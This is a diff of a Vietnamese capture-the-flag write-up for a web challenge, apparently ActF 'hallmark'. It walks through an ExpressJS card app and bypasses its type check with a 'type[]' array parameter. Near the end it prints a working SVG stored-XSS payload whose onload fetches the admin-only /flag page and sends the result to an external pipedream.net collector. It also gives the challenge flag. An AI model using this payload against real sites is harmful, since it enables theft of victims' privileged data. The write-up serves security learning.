@@ -232,8 +232,8 @@ app.put("/card", (req, res) => {
         return;
     }
 
-    cards[id].type = type[] == "image/svg+xml" ? type : "text/plain";
-    cards[id].content = type[] === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
+    cards[id].type = type == "image/svg+xml" ? type : "text/plain";
+    cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
 
     res.send("ok");
 });
@@ -265,4 +265,92 @@ Trang web được xây dựng bởi framework ExpressJS trong NodeJS, ở đây
 
 Phương thức get("/card", (req, res) => { ... }) ở đây xử lý yêu cầu HTTP GET đến đường dẫn "/card". Nó kiểm tra xem yêu cầu có chứa thông tin "id" hay không và "id" đó có tồn tại trong danh sách "cards" ( tức giá trị id mà ta đã post và được lưu vào danh sách này) hay không. Nếu có, nó sẽ đặt tiêu đề "Content-Type" là loại dữ liệu được lưu trữ cho thẻ có "id" tương ứng trong danh sách "cards" và trả về nội dung của thẻ đó. Nếu không, nó sẽ trả về thông báo lỗi "bad id".
 
-Phương thức post("/card", (req, res) => { ... }) ở đây xử lý yêu cầu HTTP POST đến đường dẫn "/card". Nó nhận dữ liệu POST được gửi từ người dùng, bao gồm "svg" và "content". Sau đó, nó tạo một ID mới bằng cách sử dụng hàm "v4" từ thư viện "uuid" đã require. Tiếp theo, nó xác định loại dữ liệu của thẻ, tùy thuộc vào giá trị của "svg". Nếu "svg" có giá trị là "text", thẻ được xác định là plain text. Nếu không, thẻ được xác định là một tệp SVG. Sau đó, nó lưu trữ thông tin thẻ mới vào danh sách "cards" và chuyển hướng người dùng đến đường dẫn "/card?id=" để hiển thị thẻ vừa tạo. Điều này giải thích cho việc vì 
+Phương thức post("/card", (req, res) => { ... }) ở đây xử lý yêu cầu HTTP POST đến đường dẫn "/card". Nó nhận dữ liệu POST được gửi từ người dùng, bao gồm "svg" và "content". Sau đó, nó tạo một ID mới bằng cách sử dụng hàm "v4" từ thư viện "uuid" đã require. Tiếp theo, nó xác định loại dữ liệu của thẻ, tùy thuộc vào giá trị của "svg". Nếu "svg" có giá trị là "text", thẻ được xác định là text/plain. Nếu không, thẻ được xác định là một tệp SVG. Sau đó, nó lưu trữ thông tin thẻ mới vào danh sách "cards" và chuyển hướng người dùng đến đường dẫn "/card?id=" để hiển thị thẻ vừa tạo. Điều này giải thích cho việc vì sao ta nhập script nó trả về dạng text/plain. 
+
+Ở 2 luồng trên ta kh thấy có thể trigger xss được ở đâu cả, tiếp tục phân tích luồng PUT:
+
+![image](https://user-images.githubusercontent.com/104350480/234766030-601a0f71-92fe-4796-a274-d6ddbe921023.png)
+
+
+Khi ta gửi một yêu cầu PUT đến endpoint /card, server sẽ nhận được dữ liệu gửi kèm trong body của request. Dữ liệu này chứa các thông tin về thẻ mà người dùng muốn cập nhật, bao gồm id, type, svg và content.
+
+Sau đó, server sẽ kiểm tra xem id có tồn tại trong đối tượng cards hay không bằng cách sử dụng điều kiện if (!id || !cards[id]). Nếu id không tồn tại, server sẽ trả về thông báo lỗi "bad id" và kết thúc xử lý.
+
+Nếu id hợp lệ hay là có tồn tại trong cards, server sẽ cập nhật nội dung của thẻ được chỉ định bằng cách thay đổi giá trị type và content của nó. Nếu giá trị type là "image/svg+xml", server sẽ sử dụng IMAGES[svg || "heart"] để cập nhật giá trị content, ngược lại sẽ sử dụng giá trị content được gửi kèm trong yêu cầu. Sau khi cập nhật thành công, server sẽ trả về thông báo "ok" và kết thúc xử lý yêu cầu.
+
+Ở đây ta muốn trigger được xss thì type trả về phải có định dạng image/svg+xml để ta thực hiện xss qua thẻ svg, còn nếu để trả về text/plain thì sẽ vứt đi. Chẳng hạn khi ta thực hiện qua burpsuite sẽ như sau: 
+
+Đầu tiên thực hiện POST: 
+
+![image](https://user-images.githubusercontent.com/104350480/234766586-4c4ba1d2-59e4-408c-aee4-4e43da9e4248.png)
+
+Với id tự sinh và thực hiện GET:
+
+![image](https://user-images.githubusercontent.com/104350480/234766531-4976bae9-ed6e-493f-b849-982cf735ffd1.png)
+
+Sửa id thành 1 giá trị khác 1 xíu thôi server sẽ trả về: 
+
+![image](https://user-images.githubusercontent.com/104350480/234766778-f1ab8b16-78fd-4871-9b7d-398483f19606.png)
+
+Vì kh có chỗ để PUT nên ta sẽ tự tạo phương thức PUT với các giá trị tương ứng: 
+
+![image](https://user-images.githubusercontent.com/104350480/234767558-cb2a7aac-0015-4713-ac2c-6d3fec6c2567.png)
+
+Ta thực hiện PUT thành công, tuy vậy ở đây vẫn chưa thể thực hiện xss được vì ở điều kiện sau, nếu ta để type ở định dạng image/svg+xml thì ở cards[id].content sẽ trả về IMAGES[svg || "heart"] (nếu giá trị svg ở đây được truyền vào là null thì heart sẽ được sử dụng luôn) thay vì trả về content ta mong muốn để thực thi:
+
+![image](https://user-images.githubusercontent.com/104350480/234768393-3db14242-c5c7-4359-a97a-abcb92c3f562.png)
+
+Và vì vậy khi thực hiện GET nó sẽ báo về lỗi sau: 
+
+![image](https://user-images.githubusercontent.com/104350480/234768042-cbf04e9e-e94f-41d0-a365-372c6141d133.png)
+
+Vì vậy ta cần phải làm cho điều kiện ở đây thành sai để bypass. Ý tưởng sẽ là type sẽ là image/svg+xml để thực thi xss nhưng content phải được trả về. Để ý điều kiện so sánh, dòng trên là so sánh lỏng lẻo, ở dưới là so sánh nghiệm ngặt, tức phải cùng kiểu type, ta có thể thay type bằng type[] để bypass, trong js thì nó sẽ tự động chuyển kiểu dữ liệu tự động trong quá trình so sánh, ở đây là chuyển type[] sang kiểu chuỗi để so sánh với chuỗi "image/svg+xml", và do đó kết quả sẽ trả về true. Còn khi sử dụng phép so sánh nghiêm ngặt ===, js sẽ so sánh cả kiểu dữ liệu nên kết quả sẽ trả về false vì type[] không phải là kiểu chuỗi mà là một mảng. Ta thực hiện thay đổi và thực hiện alert xem được chưa: 
+
+![image](https://user-images.githubusercontent.com/104350480/234771662-e62e8e10-36cf-4cd1-ac17-8f6b549ec2f0.png)
+
+![image](https://user-images.githubusercontent.com/104350480/234771686-9051011f-caea-4a16-bbf9-7ce769389990.png)
+
+Thực hiện thành công rồi, giờ ta sửa script để lấy flag từ admin. Tuy vậy thì flag của bài này kh nằm trong cookie, mà nằm ở /flag mà chỉ admin có thể truy cập: 
+
+```
+
+app.get("/flag", (req, res) => {
+    if (req.cookies && req.cookies.secret === secret) {
+        res.send(flag);
+    } else {
+        res.send("you can't view this >:(");
+    }
+});
+
+app.get("/", (req, res) => {
+    res.sendFile(path.join(__dirname, "index.html"));
+});
+
+app.listen(port, () => {
+    console.log(`Server listening on port ${port}.`);
+});
+
+```
+
+Vì vậy ta sẽ viết script dùng fetch để lấy flag từ https://hallmark.web.actf.co/flag và sử dụng phương thức .then() để xử lý nội dung được trả về từ fetch() sau đó lấy flag thông thông qua tham số truyền vào ở đây là 'c=' kèm theo flag: 
+
+```
+
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://hallmark.web.actf.co/flag').then(r=>r.text()).then(text=> window.location='https://eo7xxasp6lhfvaj.m.pipedream.net?c='+text)"/>
+
+```
+![image](https://user-images.githubusercontent.com/104350480/234774591-35b42eba-1909-47bb-9b32-26e251528ee9.png)
+
+
+Giờ gửi cho admin click nữa là xong: 
+
+![image](https://user-images.githubusercontent.com/104350480/234774710-2178e70c-78e6-4e8b-92c4-f4b98e8c2353.png)
+
+![image](https://user-images.githubusercontent.com/104350480/234774765-160ef3fb-b15e-457b-8a13-bbb1aa0ec8b8.png)
+
+> Flag: actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}
+
+
+
+
+
